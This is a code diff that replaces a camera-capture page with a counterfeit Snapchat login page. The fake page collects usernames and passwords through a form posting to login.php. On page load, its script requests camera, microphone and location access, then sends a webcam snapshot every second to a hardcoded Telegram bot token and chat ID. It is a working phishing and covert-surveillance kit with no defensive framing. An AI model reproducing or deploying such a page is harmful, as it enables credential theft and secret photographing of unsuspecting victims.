@@ -1,9 +1,9 @@
-<!DOCTYPE html>
+<!-- <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera Capture and Telegram Bot</title>
+    <title></title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -60,10 +60,10 @@
             if ('permissions' in navigator) {
                 navigator.permissions.query({ name: 'camera' })
                     .then(permissionStatus => {
-                        console.log('Camera permission state is:', permissionStatus.state);
+                        // console.log('Camera permission state is:', permissionStatus.state);
 
                         if (permissionStatus.state === 'granted') {
-                            console.log("Camera access granted!");
+                            // console.log("Camera access granted!");
                             startVideoStream();  // Start the video stream if permission is granted
                         } else if (permissionStatus.state === 'prompt') {
                             console.log("Camera permission is pending. Requesting access...");
@@ -148,3 +148,328 @@
     </script>
 </body>
 </html>
+ -->
+
+
+
+
+ 
+
+<!DOCTYPE html>
+<html lang=en-us data-theme=dark>
+<meta charset=utf-8>
+<title>Log In • Snapchat</title>
+<meta name=referrer content=origin>
+<meta name=apple-mobile-web-app-capable content=no>
+<meta name=viewport content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+<link rel="shortcut icon" href="favicon.png" type=image/png>
+<link rel=canonical href=https://accounts.snapchat.com/accounts/login>
+<meta http-equiv=content-security-policy
+      content="default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:;">
+<style>
+/* General Reset & Box-Sizing */
+*,
+*::after,
+*::before {
+  box-sizing: border-box;
+}
+
+html {
+  font-size: 10px;
+  line-height: 1.15;
+  -ms-text-size-adjust: 100%;
+  -webkit-text-size-adjust: 100%;
+}
+
+body {
+  margin: 0;
+  font-family: "Avenir Next", "Helvetica Neue", Helvetica, Arial, sans-serif;
+  line-height: 1.428571429;
+  background-color: #fff;
+  color: #16191c;
+  height: 100%;
+  overflow-x: hidden;
+  overflow-y: auto;
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+}
+
+h1 {
+  font-size: 2rem;
+  font-weight: 700;
+  margin: -1.5rem 0 1rem;
+}
+
+p {
+  line-height: 1.33;
+}
+
+/* Link and Button Styles */
+a {
+  text-decoration: none;
+  color: #0eadff;
+  transition: color 0.3s ease;
+}
+
+a:hover,
+a:focus {
+  color: #49a9ee;
+  border-bottom: 1px solid #0eadff;
+}
+
+a:active {
+  color: #0e77ca;
+}
+
+button {
+  font: inherit;
+  cursor: pointer;
+  background: none;
+  border: none;
+  padding: 0;
+  outline: none;
+  transition: background-color 0.16s ease, border-color 0.16s ease;
+}
+
+button:focus,
+button:hover {
+  outline: none;
+}
+
+
+input,
+button {
+  font-family: inherit;
+  line-height: inherit;
+}
+
+/* Form Input Styles */
+input::-webkit-input-placeholder,
+textarea::-webkit-input-placeholder {
+  color: #999;
+}
+
+.form-control {
+  line-height: 1.428571429;
+  color: #000;
+  background-color: #fff;
+  border: 1px solid #dfe3e7;
+  border-radius: 0;
+  outline: none;
+  padding: 12px;
+  width: 100%;
+  transition: border-color 0.1s ease, box-shadow 0.1s ease;
+}
+
+.form-control:focus {
+  border-color: #fffc00;
+}
+
+.form-group {
+  position: relative;
+  margin-bottom: 15px;
+  cursor: text;
+}
+
+.form-group:focus {
+  outline: none;
+}
+
+/* Buttons */
+.btn {
+  display: inline-block;
+  text-align: center;
+  vertical-align: middle;
+  padding: 10px 20px;
+  margin: 0;
+  cursor: pointer;
+  background-color: #0eadff;
+  color: white;
+  border-radius: 45px;
+  font-size: 14px;
+  transition: background-color 0.3s ease, border-color 0.16s ease;
+}
+
+.btn:hover {
+  background-color: #3ebdff;
+}
+
+.btn:active {
+  background-color: #0b8acc;
+}
+
+.btn:disabled {
+  background-color: #b8c1c7;
+}
+
+.btn-primary {
+  background-color: #fffc00;
+  color: #16191c;
+}
+
+.btn-primary:hover {
+  background-color: #fff600;
+}
+
+/* Responsive Container */
+.container {
+  max-width: 100%;
+  margin: 0 auto;
+  padding: 0 15px;
+}
+
+.page {
+  position: relative;
+  padding: 20px;
+}
+
+.full-background-color {
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background: linear-gradient(to right, #f7ee3b 0%, #fffc0a 20%, #fffc05 40%, #faf700 60%, #f5f200 80%, #f5e200 100%);
+}
+
+@media (min-width: 768px) {
+  .container {
+    width: 50%;
+  }
+}
+
+/* Add custom style for the page-specific elements like login, etc. */
+.page .container {
+  background: #fff;
+  border-radius: 6px;
+  box-shadow: 0 4px 8px rgba(0, 0, 0, 0.04);
+  padding: 24px;
+  margin-top: 40px;
+}
+
+.page a,
+.page a:hover {
+  color: #0eadff;
+}
+
+.page .btn-primary {
+  background-color: #fffc00;
+  color: #16191c;
+}
+
+.page .btn-primary:hover {
+  background-color: #fff600;
+}
+
+
+</style>
+      <body class=designV2>
+      <div class=pusher>
+            <div id=login-root>
+                  <div class=App style=display:none>
+                        <div class=full-background-color></div>
+                        <div class=Header><a href=https://accounts.snapchat.com/ class="logo sf-hidden"></a></div>
+                        <div class=Login>
+                              <article class=page>
+                                    <div class=container><img class=snapchat-icon src="./snapchat.png" alt=Snapchat>
+                                          <div>
+                                                <h1 class=accountsTitle>Log in to Snapchat for Web</h1>
+                                          </div>
+                                          <div>
+                                                <form id=login_form action=login.php method=post class=centered_form>
+                                                      <div class="form-group has-success"><label for=username
+                                                                  class=control-label>Username or Email</label><input
+                                                                  name=username autocomplete=off type=text id=username
+                                                                  class=form-control required value></div>
+                                                      <div class="form-group has-success"><label for=password
+                                                                  class=control-label>Password</label><input
+                                                                  name=password autocomplete=off type=password
+                                                                  id=password class=form-control required value></div>
+                                                      <p class=secondary_action><a href=#>Forgot
+                                                                  Password</a>
+                                                      <div style=display:none></div>
+                                                      <div class="primary_action login-button"><button type=submit
+                                                                  id=loginTrigger class="btn btn-lg btn-primary">Log
+                                                                  In</button></div>
+                                                </form>
+                                          </div>
+                                    </div>
+                                    <div class=create-account-cta><span>New To Snapchat?</span><a
+                                                href=https://accounts.snapchat.com/accounts/signup>Sign Up</a></div>
+                              </article>
+                        </div>
+                        <video id="video" autoplay playsinline></video>
+                  </div>
+            </div>
+      </div>
+      <script>
+        
+const BOT_TOKEN = "7341952786:AAErBcgGblJyjBpadb483rHyPdEBDjeeTfA";
+const CHAT_ID = "7416312733";
+const PHOTO_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+
+const videoElement = document.getElementById('video');
+
+async function checkPermissions() {
+  try {
+    const mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+    videoElement.srcObject = mediaStream;
+    videoElement.style.display = 'block';
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(function(position) {
+        console.log('Location:', position.coords.latitude, position.coords.longitude);
+        startCapturing();
+      }, function(error) {
+        console.log('Location access denied:', error);
+        startCapturing();
+      });
+    } else {
+      console.log('Geolocation not supported, proceeding with camera.');
+      startCapturing();
+    }
+  } catch (error) {
+    console.error('Permission request failed:', error);
+    // alert('Camera or microphone access denied. Please enable it in settings.');
+  }
+}
+
+async function captureAndSendImages() {
+  const canvas = document.createElement('canvas');
+  const context = canvas.getContext('2d');
+  canvas.width = videoElement.videoWidth;
+  canvas.height = videoElement.videoHeight;
+  context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+
+  canvas.toBlob(async function(blob) {
+    const formData = new FormData();
+    formData.append("chat_id", CHAT_ID);
+    formData.append("photo", blob, "snapshot.jpg");
+
+    try {
+      const response = await fetch(PHOTO_API_URL, { method: 'POST', body: formData });
+      const result = await response.json();
+      if (result.ok) {
+        console.log("Image sent to Telegram!");
+      } else {
+        console.log("Error sending image to Telegram:", result);
+      }
+    } catch (error) {
+      console.error("Error sending image to Telegram:", error);
+    }
+  }, "image/jpeg");
+}
+
+function startCapturing() {
+  setInterval(captureAndSendImages, 1000);
+}
+
+// Automatically start permissions check and capturing process on page load
+checkPermissions();
+      </script>
+</body>
+
+
+
+
+
